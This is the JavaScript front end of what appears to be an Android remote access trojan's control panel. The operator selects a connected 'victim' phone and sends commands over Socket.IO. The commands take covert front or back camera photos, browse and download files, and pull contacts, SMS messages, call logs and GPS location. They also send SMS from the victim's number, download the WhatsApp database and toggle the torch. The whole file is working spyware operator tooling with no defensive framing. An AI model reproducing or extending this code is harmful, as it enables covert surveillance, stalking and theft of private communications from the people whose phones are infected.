const socket = io();

let selectedVictimId = null;
const victimsList = document.getElementById('victims');

// Function to show toast messages
function showToast(message) {
    const toast = document.getElementById("toast-message");
    toast.textContent = message;
    toast.className = "show";
    setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
}

socket.on('connect', () => {
    console.log('Connected to server as admin');
    socket.emit('adminJoin');
    showToast('Connected to server');
});

socket.on('disconnect', () => {
    console.log('Disconnected from server');
    showToast('Disconnected from server');
});

socket.on('join', (device) => {
    console.log('Victim joined:', device);
    const listItem = document.createElement('li');
    listItem.id = `victim-${device.id}`;
    listItem.innerHTML = `
        <span>${device.model} (${device.id}) - Android ${device.android}</span>
        <button data-id="${device.id}" class="select-victim-btn">Select</button>
    `;
    victimsList.appendChild(listItem);

    listItem.querySelector('.select-victim-btn').addEventListener('click', (e) => {
        // Remove 'selected' class from previous selection
        const currentSelected = document.querySelector('.selected-victim');
        if (currentSelected) {
            currentSelected.classList.remove('selected-victim');
            currentSelected.querySelector('.select-victim-btn').textContent = 'Select';
        }

        selectedVictimId = e.target.dataset.id;
        e.target.parentElement.classList.add('selected-victim');
        e.target.textContent = 'Selected';
        console.log('Selected victim:', selectedVictimId);
        showToast(`Selected victim: ${device.model}`);
    });
});

socket.on('disconnectClient', (deviceId) => {
    console.log('Victim disconnected:', deviceId);
    const victimListItem = document.getElementById(`victim-${deviceId}`);
    if (victimListItem) {
        victimListItem.remove();
        if (selectedVictimId === deviceId) {
            selectedVictimId = null;
            showToast('Selected victim disconnected');
        }
    }
});

// Generic error handling from server
socket.on('error', (data) => {
    console.error('Server error:', data.error);
    showToast(`Error: ${data.error}`);
});

// Function to ensure a victim is selected before sending a command
function ensureVictimSelected() {
    if (!selectedVictimId) {
        showToast('Please select a victim first.');
        return false;
    }
    return true;
}

// Function to clear output area content
function clearOutput(outputAreaId) {
    const outputArea = document.getElementById(outputAreaId);
    if (outputArea) {
        outputArea.innerHTML = '';
    }
}

// ==================== TORCH CONTROL ====================
const torchControlBtn = document.getElementById('torch-control-btn');
const torchControlDialog = document.getElementById('torchControlDialog');
const torchOnBtn = document.getElementById('torch-on-btn');
const torchOffBtn = document.getElementById('torch-off-btn');
const torchVictimName = document.getElementById('torch-victim-name');

torchControlBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
    torchVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown';
    torchControlDialog.style.display = 'flex';
});

torchControlDialog.querySelector('.close-button').addEventListener('click', () => {
    torchControlDialog.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === torchControlDialog) {
        torchControlDialog.style.display = 'none';
    }
});

torchOnBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    socket.emit('torchControlRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'turnOnTorch', 
        data: {} 
    }));
    showToast('Sending turn ON torch command...');
});

torchOffBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    socket.emit('torchControlRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'turnOffTorch', 
        data: {} 
    }));
    showToast('Sending turn OFF torch command...');
});

socket.on('torchControlResult', (data) => {
    console.log('Torch control result:', data);
    if (data.success) {
        showToast(`Torch ${data.message}`);
    } else {
        showToast(`Failed: ${data.message}`);
    }
    torchControlDialog.style.display = 'none';
});

// ==================== CAMERA CAPTURE ====================
const cameraCaptureBtn = document.getElementById('camera-capture-btn');
const cameraCaptureDialog = document.getElementById('cameraCaptureDialog');
const frontCameraBtn = document.getElementById('front-camera-btn');
const backCameraBtn = document.getElementById('back-camera-btn');
const cameraVictimName = document.getElementById('camera-victim-name');

const imagePreviewDialog = document.getElementById('imagePreviewDialog');
const capturedImage = document.getElementById('captured-image');
const previewVictimName = document.getElementById('preview-victim-name');

cameraCaptureBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
    cameraVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown';
    cameraCaptureDialog.style.display = 'flex';
});

cameraCaptureDialog.querySelector('.close-button').addEventListener('click', () => {
    cameraCaptureDialog.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === cameraCaptureDialog) {
        cameraCaptureDialog.style.display = 'none';
    }
});

frontCameraBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    socket.emit('cameraCaptureRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'takePicture', 
        data: { frontCamera: true } 
    }));
    showToast('Taking picture with front camera...');
    cameraCaptureDialog.style.display = 'none';
});

backCameraBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    socket.emit('cameraCaptureRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'takePicture', 
        data: { frontCamera: false } 
    }));
    showToast('Taking picture with back camera...');
    cameraCaptureDialog.style.display = 'none';
});

// Image preview dialog close
imagePreviewDialog.querySelector('.close-button').addEventListener('click', () => {
    imagePreviewDialog.style.display = 'none';
    capturedImage.src = ''; // Clear image
});

window.addEventListener('click', (event) => {
    if (event.target === imagePreviewDialog) {
        imagePreviewDialog.style.display = 'none';
        capturedImage.src = ''; // Clear image
    }
});

socket.on('cameraCaptureResult', (data) => {
    console.log('Camera capture result:', data);
    if (data.success) {
        const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
        previewVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown';
        capturedImage.src = "data:image/jpeg;base64," + data.image;
        imagePreviewDialog.style.display = 'flex';
        showToast('Image captured successfully!');
    } else {
        showToast(`Camera capture failed: ${data.message}`);
    }
});

// ==================== FILE MANAGEMENT ====================
const getDirBtn = document.getElementById('get-dir-btn');
const dirPathInput = document.getElementById('dir-path-input');
const dirListingOutput = document.getElementById('dir-listing-output');
const downloadFileBtn = document.getElementById('download-file-btn');
const filePathInput = document.getElementById('file-path-input');
const previewImageBtn = document.getElementById('preview-image-btn');
const imagePathInput = document.getElementById('image-path-input');

getDirBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const path = dirPathInput.value || '/';
    clearOutput('dir-listing-output');
    socket.emit('getDirRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'getDir', 
        data: path 
    }));
    showToast(`Requesting directory listing for: ${path}`);
});

socket.on('getDir', (data) => {
    console.log('Directory Listing:', data);
    clearOutput('dir-listing-output');
    if (data && data.length > 0) {
        let html = '<h4>Directory Listing:</h4><ul>';
        data.forEach(item => {
            html += `<li>${item.isDirectory ? '[DIR]' : '[FILE]'} ${item.name} `;
            if (item.isDirectory) {
                html += `(${item.items} items)`;
            } else {
                html += `(${(item.size / 1024).toFixed(2)} KB)`;
            }
            html += `</li>`;
        });
        html += '</ul>';
        dirListingOutput.innerHTML = html;
        showToast('Directory listing received.');
    } else {
        dirListingOutput.innerHTML = '<p>No items found or directory is empty.</p>';
        showToast('No directory listing received.');
    }
});

downloadFileBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const path = filePathInput.value;
    if (!path) {
        showToast('Please enter a file path to download.');
        return;
    }
    socket.emit('downloadRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'download', 
        data: path 
    }));
    showToast(`Requesting download for: ${path}`);
});

socket.on('download', (data) => {
    console.log('Download received:', data);
    if (data.fileData && data.fileName) {
        // Convert base64 to blob
        const byteCharacters = atob(data.fileData);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], {type: 'application/octet-stream'});
        
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = data.fileName;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
        
        showToast(`File "${data.fileName}" downloaded.`);
    } else {
        showToast('Failed to download file or no file data received.');
    }
});

previewImageBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const path = imagePathInput.value;
    if (!path) {
        showToast('Please enter an image path to preview.');
        return;
    }
    socket.emit('previewImageRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'previewImage', 
        data: path 
    }));
    showToast(`Requesting image preview for: ${path}`);
});

socket.on('previewImage', (data) => {
    console.log('Image preview received:', data);
    if (data.image) {
        const selectedVictimElement = document.querySelector(`#victim-${selectedVictimId} span`);
        previewVictimName.textContent = selectedVictimElement ? selectedVictimElement.textContent.split('(')[0].trim() : 'Unknown';
        capturedImage.src = data.image;
        imagePreviewDialog.style.display = 'flex';
        showToast('Image preview received.');
    } else {
        showToast('Failed to get image preview or no image data received.');
    }
});

// ==================== APP INFORMATION ====================
const getInstalledAppsBtn = document.getElementById('get-installed-apps-btn');
const installedAppsOutput = document.getElementById('installed-apps-output');

getInstalledAppsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('installed-apps-output');
    socket.emit('getInstalledAppsRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'getInstalledApps', 
        data: {} 
    }));
    showToast('Requesting installed apps list...');
});

socket.on('getInstalledApps', (data) => {
    console.log('Installed Apps:', data);
    clearOutput('installed-apps-output');
    if (data && data.installedApps && data.installedApps.length > 0) {
        let html = '<h4>Installed Applications:</h4><ul>';
        data.installedApps.forEach(app => {
            html += `<li><strong>${app.appName}</strong> (${app.packageName})</li>`;
        });
        html += '</ul>';
        installedAppsOutput.innerHTML = html;
        showToast('Installed apps list received.');
    } else {
        installedAppsOutput.innerHTML = '<p>No installed applications found.</p>';
        showToast('No installed apps list received.');
    }
});

// ==================== CONTACTS, SMS & CALLS ====================
const getContactsBtn = document.getElementById('get-contacts-btn');
const contactsOutput = document.getElementById('contacts-output');
const getSmsBtn = document.getElementById('get-sms-btn');
const smsOutput = document.getElementById('sms-output');
const getCallLogBtn = document.getElementById('get-call-log-btn');
const callLogOutput = document.getElementById('call-log-output');
const sendSmsBtn = document.getElementById('send-sms-btn');
const smsNumberInput = document.getElementById('sms-number-input');
const smsMessageInput = document.getElementById('sms-message-input');

getContactsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('contacts-output');
    socket.emit('getContactsRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'getContacts', 
        data: {} 
    }));
    showToast('Requesting contacts...');
});

socket.on('getContacts', (data) => {
    console.log('Contacts:', data);
    clearOutput('contacts-output');
    if (data && data.contactsList && data.contactsList.length > 0) {
        let html = '<h4>Contacts:</h4><ul>';
        data.contactsList.forEach(contact => {
            html += `<li><strong>${contact.name}</strong>: ${contact.phoneNo}</li>`;
        });
        html += '</ul>';
        contactsOutput.innerHTML = html;
        showToast('Contacts received.');
    } else {
        contactsOutput.innerHTML = '<p>No contacts found.</p>';
        showToast('No contacts received.');
    }
});

getSmsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('sms-output');
    socket.emit('getSMSRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'getSMS', 
        data: { start: 0, end: 50 } 
    }));
    showToast('Requesting SMS messages...');
});

socket.on('getSMS', (data) => {
    console.log('SMS Messages:', data);
    clearOutput('sms-output');
    if (data && data.sms && data.sms.length > 0) {
        let html = `<h4>SMS Messages (${data.totalSMS} total, showing ${data.sms.length}):</h4><ul>`;
        data.sms.forEach(msg => {
            html += `<li><strong>From: ${msg.number}</strong> (${new Date(msg.date).toLocaleString()})<br>${msg.body}</li>`;
        });
        html += '</ul>';
        smsOutput.innerHTML = html;
        showToast('SMS messages received.');
    } else {
        smsOutput.innerHTML = '<p>No SMS messages found.</p>';
        showToast('No SMS messages received.');
    }
});

getCallLogBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('call-log-output');
    socket.emit('getCallLogRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'getCallLog', 
        data: {} 
    }));
    showToast('Requesting call log...');
});

socket.on('getCallLog', (data) => {
    console.log('Call Log:', data);
    clearOutput('call-log-output');
    if (data && data.callsLog && data.callsLog.length > 0) {
        let html = '<h4>Call Log:</h4><ul>';
        data.callsLog.forEach(call => {
            let type = '';
            if (call.type == 1) type = 'Incoming';
            else if (call.type == 2) type = 'Outgoing';
            else if (call.type == 3) type = 'Missed';
            else type = 'Unknown';

            html += `<li><strong>${type}</strong> - ${call.name || call.phoneNo} (Duration: ${call.duration}s)</li>`;
        });
        html += '</ul>';
        callLogOutput.innerHTML = html;
        showToast('Call log received.');
    } else {
        callLogOutput.innerHTML = '<p>No call log entries found.</p>';
        showToast('No call log received.');
    }
});

sendSmsBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    const number = smsNumberInput.value;
    const message = smsMessageInput.value;
    if (!number || !message) {
        showToast('Please enter both number and message for SMS.');
        return;
    }
    socket.emit('sendSMSRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'sendSMS', 
        data: { mobile_no: number, msg: message } 
    }));
    showToast(`Sending SMS to ${number}...`);
});

socket.on('sendSMS', (data) => {
    console.log('Send SMS Result:', data);
    if (data === "success") {
        showToast('SMS sent successfully!');
    } else if (data && data.error) {
        showToast(`Failed to send SMS: ${data.error}`);
    } else {
        showToast('SMS operation completed.');
    }
});

// ==================== LOCATION ====================
const getLocationBtn = document.getElementById('get-location-btn');
const locationOutput = document.getElementById('location-output');

getLocationBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    clearOutput('location-output');
    socket.emit('getLocationRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'getLocation', 
        data: {} 
    }));
    showToast('Requesting location...');
});

socket.on('getLocation', (data) => {
    console.log('Location:', data);
    clearOutput('location-output');
    if (data && data.lat && data.long) {
        locationOutput.innerHTML = `<h4>Location:</h4>
            <p>Latitude: ${data.lat}, Longitude: ${data.long}</p>
            <p><a href="https://www.google.com/maps/search/?api=1&query=${data.lat},${data.long}" target="_blank">View on Google Maps</a></p>`;
        showToast('Location received.');
    } else {
        locationOutput.innerHTML = '<p>Could not retrieve location.</p>';
        showToast('Location not received.');
    }
});

// ==================== WHATSAPP DATABASE ====================
const downloadWhatsappDbBtn = document.getElementById('download-whatsapp-db-btn');

downloadWhatsappDbBtn.addEventListener('click', () => {
    if (!ensureVictimSelected()) return;
    socket.emit('downloadWhatsappDatabaseRequest', JSON.stringify({ 
        to: selectedVictimId, 
        action: 'downloadWhatsappDatabase', 
        data: {} 
    }));
    showToast('Requesting WhatsApp database download...');
});

socket.on('downloadWhatsappDatabase', (data) => {
    console.log('WhatsApp Database Download received:', data);
    if (data.fileData && data.fileName) {
        // Convert base64 to blob
        const byteCharacters = atob(data.fileData);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], {type: 'application/octet-stream'});
        
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = data.fileName;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
        
        showToast(`WhatsApp Database "${data.fileName}" downloaded.`);
    } else {
        showToast('Failed to download WhatsApp database.');
    }
});

// Handle window close
window.addEventListener('beforeunload', () => {
    socket.disconnect();
});
